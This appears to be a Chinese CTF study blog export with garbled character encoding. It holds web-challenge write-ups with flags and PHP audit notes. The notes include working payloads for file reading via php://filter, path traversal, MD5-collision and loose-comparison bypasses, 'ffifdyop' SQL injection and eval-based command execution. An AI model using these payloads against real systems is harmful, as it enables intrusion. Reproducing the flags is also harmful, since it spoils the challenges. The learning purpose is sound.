<p>â€‹    <span id="more"></span></p>
<h2 id="ç¬¬ä¸€ç« -webå…¥é—¨-å¸¸è§çš„æœé›†"><a href="#ç¬¬ä¸€ç« -webå…¥é—¨-å¸¸è§çš„æœé›†" class="headerlink" title="[ç¬¬ä¸€ç«  webå…¥é—¨]å¸¸è§çš„æœé›†"></a>[ç¬¬ä¸€ç«  webå…¥é—¨]å¸¸è§çš„æœé›†</h2><p>dirserachå¤šæ‰«å‡ éå°±å‡ºæ¥äº†</p>
<p>robots.txt</p>
<p>index.php~</p>
<p>.index.php.swp</p>
<p>å¾—åˆ°n1book{info_1s_v3ry_imp0rtant_hack}</p>
<h2 id="ç¬¬ä¸€ç« -webå…¥é—¨-ç²—å¿ƒçš„å°æ"><a href="#ç¬¬ä¸€ç« -webå…¥é—¨-ç²—å¿ƒçš„å°æ" class="headerlink" title="[ç¬¬ä¸€ç«  webå…¥é—¨]ç²—å¿ƒçš„å°æ"></a>[ç¬¬ä¸€ç«  webå…¥é—¨]ç²—å¿ƒçš„å°æ</h2><p>gitæ³„éœ²</p>
<p>æ²¡æœ‰æƒé™</p>
<p><code>python GitHack.py http://2d7694d7-c42f-4c1d-951d-f94169586055.node4.buuoj.cn:81/.git/</code></p>
<p>ç”Ÿæˆä¸€ä¸ªindex.htmlæ–‡ä»¶æ‰“å¼€å³æœ‰flag</p>
<p><a href="https://github.com/tigert1998/GitHack-py3">GitHub - tigert1998&#x2F;GitHack-py3: A <code>.git</code> folder disclosure exploit</a></p>
<p><code>n1book&#123;git_looks_s0_easyfun&#125;</code></p>
<h2 id="ç¬¬ä¸€ç« -webå…¥é—¨-afr-1-1"><a href="#ç¬¬ä¸€ç« -webå…¥é—¨-afr-1-1" class="headerlink" title="[ç¬¬ä¸€ç«  webå…¥é—¨]afr_1 1"></a>[ç¬¬ä¸€ç«  webå…¥é—¨]afr_1 1</h2><p> ä»»æ„æ–‡ä»¶è¯»å–å‡½æ•°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p=php://filter/convert.base64-encode/resource=flag</span><br></pre></td></tr></table></figure>

<p>n1book{afr_1_solved}</p>
<h2 id="ç¬¬ä¸€ç« -webå…¥é—¨-afr-2"><a href="#ç¬¬ä¸€ç« -webå…¥é—¨-afr-2" class="headerlink" title="[ç¬¬ä¸€ç«  webå…¥é—¨]afr_2"></a>[ç¬¬ä¸€ç«  webå…¥é—¨]afr_2</h2><p>ç›®å½•ç©¿é€æ¼æ´</p>
<p>æ‰“å¼€æºç å‘ç°ç…§ç‰‡</p>
<p><code>http://60eef043-945c-47a4-aee5-4ec00836a80e.node4.buuoj.cn:81/img../</code></p>
<p><code>n1book&#123;afr_2_solved&#125;</code></p>
<h2 id="ç¬¬ä¸€ç« -webå…¥é—¨-afr-3"><a href="#ç¬¬ä¸€ç« -webå…¥é—¨-afr-3" class="headerlink" title="[ç¬¬ä¸€ç«  webå…¥é—¨]afr_3"></a>[ç¬¬ä¸€ç«  webå…¥é—¨]afr_3</h2><p>æˆ‘ä¸ä¼š</p>
<p>[buuctf åˆ·é¢˜è®°å½• <a href="https://blog.51cto.com/u_15127666/3287231">ç¬¬ä¸€ç«  webå…¥é—¨]afr_3_51CTOåšå®¢_[ç¬¬ä¸€ç«  webå…¥é—¨]afr_1 1</a></p>
<h2 id="ç¬¬äºŒç« -webè¿›é˜¶-SSRF-Training"><a href="#ç¬¬äºŒç« -webè¿›é˜¶-SSRF-Training" class="headerlink" title="[ç¬¬äºŒç«  webè¿›é˜¶]SSRF Training"></a>[ç¬¬äºŒç«  webè¿›é˜¶]SSRF Training</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_inner_ip</span>(<span class="params"><span class="variable">$url</span></span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    <span class="variable">$match_result</span>=<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(http|https)?:\/\/.*(\/)?.*$/&#x27;</span>,<span class="variable">$url</span>); </span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$match_result</span>) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">try</span> </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="variable">$url_parse</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>); </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="variable">$hostname</span>=<span class="variable">$url_parse</span>[<span class="string">&#x27;host&#x27;</span>]; </span><br><span class="line">    <span class="variable">$ip</span>=<span class="title function_ invoke__">gethostbyname</span>(<span class="variable">$hostname</span>); </span><br><span class="line">    <span class="variable">$int_ip</span>=<span class="title function_ invoke__">ip2long</span>(<span class="variable">$ip</span>); </span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;127.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> || <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;10.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> || <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;172.16.0.0&#x27;</span>)&gt;&gt;<span class="number">20</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">20</span> || <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;192.168.0.0&#x27;</span>)&gt;&gt;<span class="number">16</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">16</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_request_url</span>(<span class="params"><span class="variable">$url</span></span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">check_inner_ip</span>(<span class="variable">$url</span>)) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$url</span>.<span class="string">&#x27; is inner ip&#x27;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>(); </span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>); </span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>); </span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>); </span><br><span class="line">        <span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>); </span><br><span class="line">        <span class="variable">$result_info</span> = <span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>); </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>]) </span><br><span class="line">        &#123; </span><br><span class="line">            <span class="title function_ invoke__">safe_request_url</span>(<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>]); </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>); </span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$output</span>); </span><br><span class="line">    &#125; </span><br><span class="line">     </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]; </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$url</span>))&#123; </span><br><span class="line">    <span class="title function_ invoke__">safe_request_url</span>(<span class="variable">$url</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>[buuctf åˆ·é¢˜è®°å½• <a href="https://www.cnblogs.com/murkuo/p/14905886.html">ç¬¬äºŒç«  webè¿›é˜¶]SSRF Training - MuRKuo - åšå®¢å›­ (cnblogs.com)</a></p>
]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>phpå®¡è®¡å­¦ä¹ </title>
    <url>/2023/01/09/php%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p> æ”¶é›†ä¿¡æ¯</p>
<p>phpå‡½æ•°</p>
<p>æ­£åˆ™åŒ¹é…å…¬å¼è¯­æ³•</p>
<p>ç»•è¿‡</p>
  <span id="more"></span>

<p>è‡ªåŠ¨å¤‡ä»½å½“å‰æ–‡ä»¶</p>
<p>index.php.swp</p>
<p>index.php.swo</p>
<p>index.php.bak</p>
<p>index.php.txt</p>
<p>index.php.old</p>
<p>index.php~</p>
<p>æ•´ç«™æºç å¤‡ä»½æ–‡ä»¶</p>
<p>www wwwdata  wwwroot  web  webrooot</p>
<p>backup dist</p>
<p>&#x2F;&#x2F;åé¢å†åŠ ä¸Š.zip .tar.7z.rar</p>
<p>.tar.gz</p>
<p>æˆ–è€…å¾¡å‰‘dirserachæ‰«ä¸€ä¸‹</p>
<h2 id="phpå‡½æ•°"><a href="#phpå‡½æ•°" class="headerlink" title="phpå‡½æ•°"></a>phpå‡½æ•°</h2><p><a href="https://www.php.net/">https://www.php.net/</a></p>
<p><strong>åœ¨PHPä¸­ï¼Œ0&#x3D;&#x3D;&#x3D;FALSEæ˜¯é”™è¯¯çš„</strong></p>
<h2 id="åŒ¹é…å…¬å¼è¯­æ³•"><a href="#åŒ¹é…å…¬å¼è¯­æ³•" class="headerlink" title="åŒ¹é…å…¬å¼è¯­æ³•"></a>åŒ¹é…å…¬å¼è¯­æ³•</h2><table>
<thead>
<tr>
<th align="center">é‡è¯</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td align="center">+</td>
<td>åŒ¹é…ä»»ä½•è‡³å°‘åŒ…å«ä¸€ä¸ªå‰å¯¼å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td align="center">*</td>
<td>åŒ¹é…ä»»ä½•åŒ…å«é›¶ä¸ªæˆ–å¤šä¸ªå‰å¯¼å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td align="center">?</td>
<td>åŒ¹é…ä»»ä½•åŒ…å«é›¶ä¸ªæˆ–1ä¸ªå‰å¯¼å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td align="center">.</td>
<td>åŒ¹é…ä»»æ„ä¸€ä¸ªå­—ç¬¦ä¸²</td>
</tr>
<tr>
<td align="center">{x}</td>
<td>åŒ¹é…ä»»ä½•åŒ…å«xä¸ªå‰å¯¼å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td align="center">{x,y}</td>
<td>åŒ¹é…ä»»ä½•åŒ…å« x åˆ° y ä¸ªå‰å¯¼å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td align="center">{x,}</td>
<td>åŒ¹é…ä»»ä½•åŒ…å«è‡³å°‘xä¸ªå‰å¯¼å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td align="center">^</td>
<td>åŒ¹é…å­—ç¬¦ä¸²çš„è¡Œé¦–</td>
</tr>
<tr>
<td align="center">$</td>
<td>åŒ¹é…å­—ç¬¦ä¸²çš„è¡Œå°¾</td>
</tr>
<tr>
<td align="center">|</td>
<td>é€‰æ‹©ç¬¦ åŒ¹é…å­—ç¬¦ä¸²çš„å·¦è¾¹æˆ–è€…å³è¾¹</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th align="center">å…ƒå­—ç¬¦</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td align="center">[a-z]</td>
<td>åŒ¹é…ä»»ä½•åŒ…å«å°å†™å­—æ¯a-zçš„å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td align="center">[A-Z]</td>
<td>åŒ¹é…ä»»ä½•åŒ…å«å¤§å†™å­—æ¯A-Zçš„å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td align="center">[0-9]</td>
<td>åŒ¹é…ä»»ä½•åŒ…å«0-9çš„å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td align="center">[abc]</td>
<td>åŒ¹é…ä»»ä½•åŒ…å«å°å†™å­—æ¯a,b,cçš„å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td align="center">[^abc]</td>
<td>åŒ¹é…ä»»ä½•ä¸åŒ…å«å°å†™å­—æ¯a,b,cçš„å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td align="center">[a-zA-Z0-9_]</td>
<td>åŒ¹é…ä»»ä½•åŒ…å«a-zA-Z0-9å’Œä¸‹åˆ’çº¿çš„å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td align="center">\w</td>
<td>åŒ¹é…ä»»ä½•åŒ…å«a-zA-Z0-9å’Œä¸‹åˆ’çº¿çš„å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td align="center">\W</td>
<td>åŒ¹é…ä»»ä½•ä¸åŒ…å«a-zA-Z0-9å’Œä¸‹åˆ’çº¿çš„å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td align="center">\d</td>
<td>åŒ¹é…ä»»ä½•åŒ…å«æ•°å­—å­—ç¬¦</td>
</tr>
<tr>
<td align="center">\D</td>
<td>åŒ¹é…ä»»ä½•éæ•°å­—å­—ç¬¦</td>
</tr>
<tr>
<td align="center">\s</td>
<td>åŒ¹é…ä»»ä½•ç©ºç™½å­—ç¬¦</td>
</tr>
<tr>
<td align="center">\S</td>
<td>åŒ¹é…ä»»ä½•éç©ºç™½å­—ç¬¦</td>
</tr>
<tr>
<td align="center">\b</td>
<td>åŒ¹é…æ˜¯å¦åˆ°è¾¾äº†å•è¯è¾¹ç•Œ</td>
</tr>
<tr>
<td align="center">\B</td>
<td>åŒ¹é…æ²¡æœ‰åˆ°è¾¾äº†å•è¯è¾¹ç•Œ</td>
</tr>
<tr>
<td align="center">\</td>
<td>åŒ¹é…æ­£åˆ™ä¸­çš„ç‰¹æ®Šå­—ç¬¦</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th align="center">ä¿®é¥°ç¬¦</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td align="center">i</td>
<td>å®Œå…¨ä¸åŒºåˆ†å¤§å°å†™</td>
</tr>
<tr>
<td align="center">m</td>
<td>å¯ä»¥é‡‡ç”¨å¤šè¡Œè¯†åˆ«,é‡åˆ°æ¢è¡Œä¹Ÿæ‰¿è®¤åŒ¹é…è§„åˆ™</td>
</tr>
<tr>
<td align="center">x</td>
<td>å¿½ç•¥æ‰è§„åˆ™æ¨¡å¼ä¸­çš„ç©ºç™½å­—ç¬¦</td>
</tr>
<tr>
<td align="center">A</td>
<td>å¼ºåˆ¶ä»å¤´å¼€å§‹åŒ¹é…</td>
</tr>
<tr>
<td align="center">U</td>
<td>ç¦æ­¢è´ªå©ªåŒ¹é…ï¼Œåªè·Ÿè¸ªåˆ°æœ€è¿‘çš„ä¸€ä¸ªåŒ¹é…ç¬¦å¹¶ç»“æŸ</td>
</tr>
</tbody></table>
<p><a href="http://sai2.game178.cn/index.php/index/index/view/id/8">http://sai2.game178.cn/index.php/index/index/view/id/8</a></p>
<h2 id="intval"><a href="#intval" class="headerlink" title="intval"></a>intval</h2><p>ç›´åˆ°é‡ä¸Šæ•°å­—æˆ–æ­£è´Ÿç¬¦å·æ‰å¼€å§‹åšè½¬æ¢ï¼Œå†é‡åˆ°éæ•°å­—æˆ–<a href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020">å­—ç¬¦ä¸²</a>ç»“æŸæ—¶ï¼Œç»“æŸè½¬æ¢</p>
<p>intval($id)ä¼šä»å­—ç¬¦ä¸²$idçš„èµ·å§‹ä½ç½®å¼€å§‹å»æ•°å­—ç¢°åˆ°éæ•°å­—å°±ç»“æŸ,å½“èµ·å§‹ä½ç½®ä¸ºéæ•°å­—æ—¶åˆ™ä¸º0ã€‚<br>æ¯”å¦‚<br>intval(â€˜100a123â€™)&#x3D;100<br>intval(â€˜a123â€™)&#x3D;0</p>
<p><code>?id=&#39;1000&#39; //&quot;1000&quot;æˆ–(1000)çš†å¯ ?id=125&lt;&lt;3 //å·¦ç§» ?id=680|320 //æŒ‰ä½æˆ– ?id=992^8 //æŒ‰ä½å¼‚æˆ– ?id=~~1000 //ä¸¤æ¬¡å–å ?id=0x3e8 //åå…­è¿›åˆ¶ ?id=0b1111101000 //äºŒè¿›åˆ¶</code></p>
<p><code>?id=(1000)</code>ä»¥åŠ+-*&#x2F;è¿ç®—</p>
<h2 id="x3D-x3D-ç»•è¿‡"><a href="#x3D-x3D-ç»•è¿‡" class="headerlink" title="&#x3D;&#x3D;ç»•è¿‡"></a>&#x3D;&#x3D;ç»•è¿‡</h2><p>PHPæ¯”è¾ƒè¿ç®—ç¬¦ &#x3D;&#x3D;åœ¨è¿›è¡Œæ¯”è¾ƒçš„æ—¶å€™æ˜¯å¼±ç±»å‹æ¯”è¾ƒï¼Œåªéœ€è¦æ¯”è¾ƒä¸¤ä¸ªå€¼ç›¸ç­‰å°±è¡Œï¼Œä¸ä¼šæ¯”è¾ƒç±»å‹</p>
<p>PHPåœ¨å¤„ç†å“ˆå¸Œå­—ç¬¦ä¸²æ—¶ï¼Œä¼šåˆ©ç”¨â€!&#x3D;â€æˆ–â€&#x3D;&#x3D;â€æ¥å¯¹å“ˆå¸Œå€¼è¿›è¡Œæ¯”è¾ƒï¼Œå®ƒæŠŠæ¯ä¸€ä¸ªä»¥â€0Eâ€å¼€å¤´çš„å“ˆå¸Œå€¼éƒ½è§£é‡Šä¸º0ï¼Œæ‰€ä»¥å¦‚æœä¸¤ä¸ªä¸åŒçš„å¯†ç ç»è¿‡å“ˆå¸Œä»¥åï¼Œå…¶å“ˆå¸Œå€¼éƒ½æ˜¯ä»¥â€0Eâ€å¼€å¤´çš„ï¼Œé‚£ä¹ˆPHPå°†ä¼šè®¤ä¸ºä»–ä»¬ç›¸åŒï¼Œéƒ½æ˜¯0</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br></pre></td></tr></table></figure>

<p>&#x3D;&#x3D;&#x3D;ç»•è¿‡<br>PHPæ¯”è¾ƒè¿ç®—ç¬¦ &#x3D;&#x3D;&#x3D;åœ¨è¿›è¡Œæ¯”è¾ƒçš„æ—¶å€™ï¼Œä¼šå…ˆåˆ¤æ–­ä¸¤ç§å­—ç¬¦ä¸²çš„ç±»å‹æ˜¯å¦ç›¸ç­‰ï¼Œå†æ¯”è¾ƒå€¼æ˜¯å¦ç›¸ç­‰ã€‚åªè¦ä¸¤è¾¹å­—ç¬¦ä¸²ç±»å‹ä¸åŒä¼šè¿”å›false</p>
<p>ç»•è¿‡æ–¹æ³•ï¼šä½¿ç”¨æ•°ç»„ç»•è¿‡</p>
<p>if($_GET[â€˜nameâ€™] !&#x3D; $_GET[â€˜passwordâ€™]){</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">MD5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) == <span class="title function_ invoke__">MD5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;?&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>}</p>
<p>&#x2F;&#x2F;name[]&#x3D;1&amp;password[]&#x3D;2</p>
<p>PHPä¸­md5()å‡½æ•°æ— æ³•å¤„ç†æ•°ç»„ï¼ˆä¼šè¿”å›NULLï¼‰</p>
<p>md5å€¼ç›¸ç­‰bpæŠ“åŒ…ä¼ å‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</span><br><span class="line">&amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</span><br></pre></td></tr></table></figure>

<p>&#x3D;&#x3D;çš„ä¹Ÿå¯ä»¥ç”¨æ•°ç»„ç»•è¿‡</p>
<h2 id="is-numeric"><a href="#is-numeric" class="headerlink" title="is_numeric"></a>is_numeric</h2><p>16è¿›åˆ¶ç»•è¿‡</p>
<p>ç©ºå­—ç¬¦%00 æˆ–è€…%20</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$password</span>)) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;password can&#x27;t be number&lt;/br&gt;&quot;</span>;</span><br><span class="line">	&#125;<span class="keyword">elseif</span> (<span class="variable">$password</span> == <span class="number">404</span>) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;Password Right!&lt;/br&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li><p>æ•°å€¼%20</p>
</li>
<li><p>%00æ•°å€¼</p>
</li>
<li><p>æ•°å€¼%00</p>
</li>
</ol>
<h2 id="ffifdyop"><a href="#ffifdyop" class="headerlink" title="ffifdyop"></a>ffifdyop</h2><p>ç»è¿‡md5åŠ å¯†åï¼š276f722736c95d99e921722cf9ed621c</p>
<p>å†è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼šâ€™orâ€™6&lt;ä¹±ç &gt; å³  <code>&#39;or&#39;66 ]  !r,  b</code></p>
<p>ç”¨é€”ï¼š</p>
<p>select * from admin where password&#x3D;â€™â€™orâ€™6&lt;ä¹±ç &gt;â€™</p>
<p>å°±ç›¸å½“äºselect * from admin where password&#x3D;â€™â€™or 1 å®ç°sqlæ³¨å…¥</p>
<h2 id="ereg"><a href="#ereg" class="headerlink" title="ereg"></a>ereg</h2><p>**ereg()**å‡½æ•°ç”¨æŒ‡å®šçš„æ¨¡å¼æœç´¢ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­æŒ‡å®šçš„å­—ç¬¦ä¸²,å¦‚æœåŒ¹é…æˆåŠŸè¿”å›true,å¦åˆ™,åˆ™è¿”å›falseã€‚æœç´¢å­—æ¯çš„å­—ç¬¦æ˜¯å¤§å°å†™æ•æ„Ÿçš„ã€‚</p>
<p>â‘ %00æˆªæ–­åŠé‡åˆ°%00åˆ™é»˜è®¤ä¸ºå­—ç¬¦ä¸²çš„ç»“æŸ</p>
<p>  â‘¡å½“ntfä¸ºæ•°ç»„æ—¶å®ƒçš„è¿”å›å€¼ä¸æ˜¯FALSE</p>
<p>web108</p>
<p>payload :  c&#x3D;a%00778  </p>
<h2 id="å¼‚å¸¸å¤„ç†ç±»"><a href="#å¼‚å¸¸å¤„ç†ç±»" class="headerlink" title="å¼‚å¸¸å¤„ç†ç±»"></a>å¼‚å¸¸å¤„ç†ç±»</h2><p>web109</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;</span><br><span class="line">    $v1 = $_GET[&#x27;v1&#x27;];</span><br><span class="line">    $v2 = $_GET[&#x27;v2&#x27;];</span><br><span class="line"></span><br><span class="line">    if(preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v1) &amp;&amp; preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v2))&#123;</span><br><span class="line">            eval(&quot;echo new $v1($v2());&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ä½“æ¥è¯´ï¼Œè¯¥è¯­å¥ä½¿ç”¨äº† PHP ä¸­çš„ â€œå˜é‡å‡½æ•°â€ è¯­æ³•ï¼Œå…¶ä¸­ $v1 æ˜¯ä¸€ä¸ªå˜é‡ï¼ŒåŒ…å«ä¸€ä¸ªç±»åï¼Œ$v2 æ˜¯ä¸€ä¸ªå˜é‡ï¼ŒåŒ…å«å‚æ•°å€¼ã€‚è¯¥è¯­å¥çš„æ‰§è¡Œå°†åˆ›å»ºä¸€ä¸ªæ–°çš„ $v1 ç±»çš„å®ä¾‹ï¼Œå¹¶å°† $v2 çš„å€¼ä½œä¸ºå‚æ•°ä¼ é€’ç»™ $v1 ç±»çš„æ„é€ å‡½æ•°ã€‚</p>
<p>ä¾‹å¦‚ï¼Œå‡è®¾ $v1 åŒ…å«ç±»å MyClassï¼Œ$v2 åŒ…å«å‚æ•°å€¼ â€œhelloâ€ï¼Œåˆ™æ‰§è¡Œè¯¥è¯­å¥å°†åˆ›å»ºä¸€ä¸ªæ–°çš„ MyClass å¯¹è±¡å®ä¾‹ï¼Œå¹¶è°ƒç”¨ MyClass çš„æ„é€ å‡½æ•°ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phpCopy code</span><br><span class="line">$obj = new MyClass(&quot;hello&quot;);</span><br></pre></td></tr></table></figure>

<p>è¯·æ³¨æ„ï¼Œå¦‚æœ $v1 ä¸­åŒ…å«çš„ç±»åä¸å­˜åœ¨æˆ–æ— æ³•è®¿é—®ï¼Œåˆ™ä¼šå¼•å‘ä¸€ä¸ªè‡´å‘½é”™è¯¯ã€‚åŒæ ·ï¼Œå¦‚æœ $v1 ç±»æ²¡æœ‰å®šä¹‰æ„é€ å‡½æ•°æˆ–æ„é€ å‡½æ•°éœ€è¦ä¸åŒæ•°é‡æˆ–ç±»å‹çš„å‚æ•°ï¼Œåˆ™ä¹Ÿä¼šå¼•å‘ä¸€ä¸ªé”™è¯¯ã€‚</p>
<p>Exceptionæ˜¯ä¸€ä¸ªå†…ç½®ç±»ï¼Œç”¨äºè¡¨ç¤ºç¨‹åºè¿è¡Œæ—¶å‡ºç°çš„å¼‚å¸¸æƒ…å†µã€‚å¯ä»¥é€šè¿‡æŠ›å‡ºï¼ˆthrowï¼‰å¼‚å¸¸æ¥æŒ‡ç¤ºç¨‹åºä¸­çš„é”™è¯¯æˆ–é—®é¢˜ï¼Œç„¶åé€šè¿‡æ•è·ï¼ˆcatchï¼‰å¼‚å¸¸æ¥å¤„ç†å®ƒä»¬ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v1=Exception();system(&quot;ls&quot;);&amp;v2=a</span><br><span class="line">?v1=Exception();system(&quot;tac%09fl36dg.txt&quot;);&amp;v2=a</span><br><span class="line">?v1=ReflectionClass&amp;v2=system(&quot;ls&quot;)</span><br><span class="line">?v1=ReflectionClass(&quot;PDO&quot;);system(&quot;ls&quot;);&amp;v2=a</span><br></pre></td></tr></table></figure>

<p>ä»è€Œå®ç°å‘½ä»¤æ‰§è¡Œ</p>
<h2 id="FilesystemIteratorç±»è¯»å–-æ–‡ä»¶"><a href="#FilesystemIteratorç±»è¯»å–-æ–‡ä»¶" class="headerlink" title="FilesystemIteratorç±»è¯»å– æ–‡ä»¶"></a>FilesystemIteratorç±»è¯»å– æ–‡ä»¶</h2><p>web110</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span 